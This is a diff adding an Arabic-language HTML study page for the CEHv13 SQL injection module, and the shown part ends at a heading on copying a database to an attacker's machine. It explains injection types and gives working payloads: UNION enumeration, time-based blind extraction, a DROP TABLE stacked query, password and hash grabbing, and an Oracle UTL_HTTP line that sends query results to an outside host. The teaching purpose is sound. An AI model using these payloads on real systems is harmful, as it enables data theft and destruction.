@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CEHv13 · Module 15: SQL Injection</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{--bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;--border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}#toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}.term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0 6px;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}:root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}li::marker{color:var(--red);font-family:var(--mono);}li>ul,li>ol{margin-top:9px;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}blockquote p+p{margin-top:10px;}blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}.callout p+p{margin-top:10px;}.callout ul,.callout ol{margin:6px 0 0;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}.callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}.callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}.callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}.callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}.callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}.callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,0.08);}.callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}.copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}.takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}.step-body p{margin:0 0 10px;}.step-body p:last-child{margin-bottom:0;}.step-body ul{margin:8px 0 0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}.method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls"><button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button></div>
+
+<div class="page">
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@ceh:~/module-15$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">EC-Council · CEHv13 · Module 15</span>
+    <h1>الـ SQL Injection</h1>
+    <p class="lede">من مفاهيم الـ SQL Injection وأنواعه الثلاثة (In-band وBlind وOut-of-Band)، مرورًا بمنهجية الهجوم الكاملة (جمع المعلومات وUnion Injection وBlind Time-based) والـ Advanced SQL Injection (OS Shell وDatabase Backdoor وDNS Exfiltration وNoSQL)، ووصولاً لتقنيات تجاوز الـ WAF والإجراءات المضادة والأدوات.</p>
+    <div class="tags">
+      <span class="tag">sql-injection</span><span class="tag">in-band</span>
+      <span class="tag">blind-sqli</span><span class="tag">union-injection</span>
+      <span class="tag">os-shell</span><span class="tag">dns-exfiltration</span>
+      <span class="tag">waf-bypass</span><span class="tag">nosql-injection</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>مفاهيم الـ SQL Injection</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>أنواع الـ SQL Injection</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>منهجية الـ SQL Injection</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>الـ Advanced SQL Injection</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>تقنيات تجاوز الـ Firewall والـ IDS</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>الإجراءات المضادة</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">مفاهيم الـ SQL Injection</span></h2>
+
+<h3>ما هو الـ SQL Injection؟</h3>
+<p>الـ SQL (Structured Query Language) لغة نصية يستخدمها سيرفر قاعدة البيانات. أوامره الأساسية: <code>INSERT</code>، <code>SELECT</code>، <code>UPDATE</code>، <code>DELETE</code>.</p>
+<p>المبرمجون يستخدمون أوامر SQL تسلسلية مع بارامترات يُوفِّرها العميل، مما يُسهِّل على المهاجم حقن أوامر. الـ SQL Injection تقنية تستغل ثغرات الإدخال غير المعقَّم لتمرير أوامر SQL عبر تطبيق الويب للتنفيذ في قاعدة البيانات الخلفية.</p>
+<div class="callout definition"><div class="callout-label">السبب الجوهري</div><p>SQL Injection ثغرة في <strong>تطبيق الويب</strong> وليست في قاعدة البيانات أو الـ Web Server. السبب هو أن التطبيق لا يتحقّق بشكل صحيح من المدخلات قبل تمريرها لجملة SQL.</p></div>
+
+
+<h3>لماذا يُعدّ SQL Injection خطيرًا؟</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>نوع الهجوم</th><th>الأثر</th></tr></thead>
+<tbody>
+<tr><td>Authentication Bypass</td><td>تسجيل الدخول بدون اسم مستخدم أو كلمة مرور صالحين — الحصول على صلاحيات Admin</td></tr>
+<tr><td>Authorization Bypass</td><td>تعديل معلومات التفويض المخزَّنة في قاعدة البيانات</td></tr>
+<tr><td>Information Disclosure</td><td>استخراج معلومات حسّاسة مخزَّنة في قاعدة البيانات</td></tr>
+<tr><td>Compromised Data Integrity</td><td>تشويه صفحات الويب، حقن محتوى خبيث، تعديل محتوى قاعدة البيانات</td></tr>
+<tr><td>Compromised Data Availability</td><td>حذف بيانات قاعدة البيانات أو السجلات أو معلومات التدقيق</td></tr>
+<tr><td>Remote Code Execution</td><td>اختراق نظام التشغيل المضيف</td></tr>
+</tbody>
+</table></div>
+
+
+<!-- LU2 -->
+
+<hr />
+
+<h2 id="lu2"><span class="num">02</span><span class="htext">أنواع الـ SQL Injection</span></h2>
+
+
+
+<div class="table-wrap"><table>
+<thead><tr><th>النوع الرئيسي</th><th>الوصف</th><th>الأنواع الفرعية</th></tr></thead>
+<tbody>
+<tr><td>In-band SQL Injection</td><td>المهاجم يستخدم نفس قناة الاتصال لتنفيذ الهجوم واسترداد النتائج — الأكثر شيوعًا والأسهل استغلالًا</td><td>Error-based، UNION Injection، Stored Procedure، Tautology، End-of-Line Comment، In-line Comments، Piggybacked Query</td></tr>
+<tr><td>Blind / Inferential SQL Injection</td><td>لا توجد رسائل خطأ — المهاجم يُرسِل الاستعلام الخبيث ويستنتج البنية من النتائج Boolean. أبطأ في التنفيذ لأن النتيجة دائمًا True/False</td><td>Boolean Exploitation، Heavy Query، Time-based (WAITFOR DELAY)، Double-Blind</td></tr>
+<tr><td>Out-of-Band SQL Injection</td><td>يستخدم قنوات اتصال مختلفة (وظائف البريد الإلكتروني أو كتابة الملفات) للهجوم والحصول على النتائج — صعب التنفيذ لأنه يتطلّب التحقّق من خصائص سيرفر قاعدة البيانات</td><td>DNS Exfiltration، HTTP Requests</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>In-band SQL Injection — الأنواع الفرعية</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>الشرح</th><th>المثال</th></tr></thead>
+<tbody>
+<tr><td>Error-based</td><td>المهاجم يُدخِل بيانات خاطئة عمدًا يُرغِم قاعدة البيانات على إرجاع رسالة خطأ تكشف معلومات عنها — مفيد جدًا لبناء طلب استغلال الثغرة</td><td><code>id=10||UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))--</code> → ORA-292257</td></tr>
+<tr><td>System Stored Procedure</td><td>استغلال الإجراءات المخزَّنة لو التطبيق لا يُعقِّم المدخلات المستخدَمة لبناء استعلامات SQL ديناميكية لها</td><td>تنفيذ أوامر OS عبر <code>xp_cmdshell</code></td></tr>
+<tr><td>Illegal / Logically Incorrect Query</td><td>إرسال استعلام غير صحيح عمدًا لتوليد رسالة خطأ مفيدة لاستخراج بنية قاعدة البيانات</td><td>حقن أنواع بيانات خاطئة أو أسماء جداول غير موجودة</td></tr>
+<tr><td>Tautology</td><td>استخدام شرط OR بحيث يكون شرط WHERE دائمًا صحيحًا — يُستخدَم لتجاوز المصادقة</td><td><code>OR 1=1--</code></td></tr>
+<tr><td>End-of-Line Comment</td><td>استخدام <code>--</code> لتحويل بقية الاستعلام الأصلي لتعليق يُتجاهَل</td><td><code>admin'--</code> → يتجاهل شرط كلمة المرور</td></tr>
+<tr><td>In-line Comments</td><td>دمج مدخلات ضعيفة متعددة في استعلام واحد بـ <code>/* */</code> — يتجاوز Blacklisting ويُزيل المسافات ويُشوِّش</td><td><code>UN/**/ION SEL/**/ECT</code></td></tr>
+<tr><td>Piggybacked Query</td><td>حقن استعلام خبيث إضافي ملحق بالاستعلام الأصلي باستخدام الفاصلة المنقوطة <code>;</code> كمُفصِّل استعلامات — يُسمّى أيضًا Stacked Queries Attack</td><td><code>SELECT...; DROP TABLE users--</code></td></tr>
+</tbody>
+</table></div>
+
+
+<h3>UNION SQL Injection</h3>
+<p>تقنية تدمج استعلامًا مزوَّرًا مع الاستعلام الأصلي. بعد تحديد عدد وأنواع الأعمدة:</p>
+<div class="code-wrap"><span class="code-tag">sql — union injection example</span><pre><code>SELECT Name, Phone, Address FROM Users WHERE Id=1
+-- الهجوم:
+$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
+-- النتيجة: يضيف أرقام بطاقات الائتمان لنتيجة الاستعلام الأصلي</code></pre></div>
+
+
+<h3>Blind SQL Injection — Boolean وHeavy Query</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Boolean Exploitation</td><td>إرسال جمل True وFalse ومقارنة استجابة الصفحة لاستنتاج نجاح الحقن. مثال: <code>id=67 AND 1=2</code> → صفحة فارغة = نجاح الحقن</td></tr>
+<tr><td>Heavy Query</td><td>استخدام استعلامات ثقيلة تستغرق وقتًا طويلًا بدلًا من دوال التأخير — يُنشئ تأخيرًا زمنيًا بضمّات متعددة على جداول النظام. مثال: <code>AND 1 &lt; SELECT count(*) FROM all_users A, all_users B, all_users C</code></td></tr>
+</tbody>
+</table></div>
+
+<div class="callout note"><div class="callout-label">Double-Blind SQL Injection</div><p>هجوم متقدّم بدون أي تغذية راجعة مباشرة (لا Error Messages ولا بيانات). المهاجم يبحث عن مؤشّرات غير مباشرة: تغيّرات في سلوك التطبيق أو أوقات الاستجابة. يستخدم Boolean-based وTime-based Blind SQL Injection.</p></div>
+
+
+<!-- LU3 -->
+
+<hr />
+
+<h2 id="lu3"><span class="num">03</span><span class="htext">منهجية الـ SQL Injection</span></h2>
+
+
+
+<h3>مرحلة جمع المعلومات</h3>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">التحقّق من الاتصال بقاعدة البيانات</div><div class="step-body"><p>تحديد ما إذا كان تطبيق الويب يتصل بسيرفر قاعدة بيانات للوصول للبيانات.</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">تعداد حقول الإدخال</div><div class="step-body"><p>جمع كل حقول الإدخال والحقول المخفية وطلبات POST التي يمكن استخدامها في صياغة استعلام SQL.</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">حقن كود اختباري</div><div class="step-body"><p>محاولة حقن كود في حقول الإدخال لتوليد خطأ.</p></div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">اختبار الأنواع</div><div class="step-body"><p>محاولة إدخال قيمة نصية حيث تُتوقَّع قيمة رقمية في حقل الإدخال.</p></div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">استخدام UNION</div><div class="step-body"><p>استخدام عامل UNION لدمج نتائج SELECT بيانات إضافية.</p></div></div>
+<div class="step-item"><div class="step-num">6</div><div class="step-title">قراءة رسائل الخطأ</div><div class="step-body"><p>التحقّق من رسائل الخطأ التفصيلية للحصول على معلومات لتنفيذ الهجوم.</p></div></div>
+</div>
+
+
+<h3>كشف الثغرات — Function Testing</h3>
+<div class="code-wrap"><span class="code-tag">http — function testing payloads</span><pre><code>http://certifiedhacker.com/?parameter=123
+http://certifiedhacker.com/?parameter=1'
+http://certifiedhacker.com/?parameter=1'#
+http://certifiedhacker.com/?parameter=1"
+http://certifiedhacker.com/?parameter=1 AND 1=1--
+http://certifiedhacker.com/?parameter=1 AND 1=2--
+http://certifiedhacker.com/?parameter=1'/*
+http://certifiedhacker.com/?parameter=1' AND '1'='1
+http://certifiedhacker.com/?parameter=1 order by 1000</code></pre></div>
+
+
+<h3>كشف مشاكل الإدخال</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>ما تبحث عنه</th><th>أسلوب الكشف</th></tr></thead>
+<tbody>
+<tr><td>Input Sanitization</td><td>إرسال علامة اقتباس مفردة <code>'</code> أو مزدوجة <code>"</code> كإدخال لتحديد ما لم يُعقَّم</td></tr>
+<tr><td>SQL Identifier Injection</td><td>استخدام القوس الأيمن <code>]</code> لتحديد ما يُستخدَم كجزء من معرِّف SQL بدون تعقيم</td></tr>
+<tr><td>Truncation Issues</td><td>إرسال سلاسل طويلة من الاقتباسات المفردة أو القوس — قد تستنفد دوال REPLACE وQUOTENAME</td></tr>
+<tr><td>SQL Modification</td><td>إرسال سلاسل طويلة من البيانات غير المفيدة — قد تُطلِق أخطاء SQL في الصفحة</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>Union SQL Injection — استخراج تفصيلي</h3>
+<div class="code-wrap"><span class="code-tag">sql — union injection enumeration</span><pre><code>-- 1. استخراج اسم قاعدة البيانات
+http://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,DB_NAME,3,4--
+
+-- 2. استخراج أسماء الجداول
+http://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4
+    from sysobjects where xtype=char(85)--
+
+-- 3. استخراج أسماء الأعمدة
+http://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,column_name,3,4
+    from DB_NAME.information_schema.columns where table_name='EMPLOYEE_TABLE'--
+
+-- 4. استخراج البيانات من العمود الأول
+http://certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4
+    from EMPLOYEE_NAME--</code></pre></div>
+
+
+<h3>Blind SQL Injection — استخراج بيانات المستخدم (Time-based)</h3>
+<div class="code-wrap"><span class="code-tag">sql — blind time-based user extraction</span><pre><code>-- فحص طول اسم المستخدم
+http://certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+-- (زيّد الرقم لحد ما الـ DBMS يرجع TRUE)
+
+-- فحص الحرف الأول من اسم المستخدم (a=97, b=98, c=99...)
+http://certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--
+http://certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+
+-- نفس الأسلوب لاسم قاعدة البيانات
+http://certifiedhacker.com/page.aspx?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--
+http://certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=97) WAITFOR DELAY '00:00:10'--
+-- (لو DB_NAME() = ABCD: a=97, b=98, c=99, d=100 → كلها TRUE)</code></pre></div>
+
+<div class="callout tip"><div class="callout-label">آلية Time-based</div><p>المنطق بسيط: لو الاستعلام صحيح يتأخّر الرد 10 ثواني = TRUE، لو فوري = FALSE. بالتكرار مع كل حرف وكل موضع تقدر تبني اسم المستخدم/قاعدة البيانات حرفًا بحرف.</p></div>
+
+
+<h3>Blind SQL Injection — Out-of-Band Exploitation</h3>
+<div class="code-wrap"><span class="code-tag">sql — out-of-band via oracle utl_http</span><pre><code>SELECT * FROM products WHERE id_product=10
+-- الطلب الخبيث (Oracle):
+http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)--
+-- يُرسِل نتيجة الاستعلام لسيرفر المهاجم عبر HTTP</code></pre></div>
+
+
+<h3>Second-Order SQL Injection</h3>
+<p>يحدث لما بيانات الإدخال تُخزَّن في قاعدة البيانات أولًا، ثم تُستخدَم لاحقًا في معالجة استعلام SQL آخر بدون تحقّق أو Parameterized Queries.</p>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">حقن الإدخال</div><div class="step-body"><p>المهاجم يُرسِل إدخالًا مُصمَّمًا في طلب HTTP — التطبيق يحفظه في قاعدة البيانات ويردّ على الطلب.</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">إرسال طلب ثانٍ</div><div class="step-body"><p>المهاجم يُرسِل طلبًا ثانيًا.</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">تنفيذ الحقن</div><div class="step-body"><p>التطبيق يعالج الطلب الثاني بالإدخال الأول المخزَّن وينفّذ استعلام SQL الخبيث.</p></div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">استلام النتائج</div><div class="step-body"><p>النتائج تُرجَع للمهاجم في الاستجابة على الطلب الثاني إن وُجِدت.</p></div></div>
+</div>
+
+
+<!-- LU4 -->
+
+<hr />
+
+<h2 id="lu4"><span class="num">04</span><span class="htext">الـ Advanced SQL Injection</span></h2>
+
+
+
+<h3>تعداد قاعدة البيانات</h3>
+<div class="code-wrap"><span class="code-tag">sql — database enumeration</span><pre><code>-- جميع قواعد البيانات على السيرفر
+' and 1 in (select min(name) from master.dbo.sys.databases where name >'.') --
+
+-- مكان ملفات قواعد البيانات
+' and 1 in (select min(filename) from master.dbo.sys.databases where filename >'.') --
+
+-- جداول وأعمدة في استعلام واحد
+' union select 0, sys.objects.name + ': ' + sys.columns.name + ': ' + sys.types.name, 1,1,'1',1,1,1,1,1
+  from sys.objects, sys.columns, sys.types
+  where sys.objects.xtype = 'U'
+  AND sys.objects.id = sys.columns.id
+  AND sys.columns.xtype = sys.types.xtype --</code></pre></div>
+
+
+<h3>سرقة كلمات المرور والـ Hashes</h3>
+<div class="code-wrap"><span class="code-tag">sql — password grabbing</span><pre><code>-- استخراج كلمات المرور كنص
+begin declare @var varchar(8000) set @var=':'
+select @var=@var+' '+login+'/'+password+' ' from users where login>@var
+select @var as var into temp end; --
+' and 1 in (select var from temp) --
+' ; drop table temp --
+
+-- استخراج SQL Server Hashes
+SELECT password FROM sys.syslogins</code></pre></div>
+
+
+<h3>نقل قاعدة البيانات لجهاز المهاجم</h3>
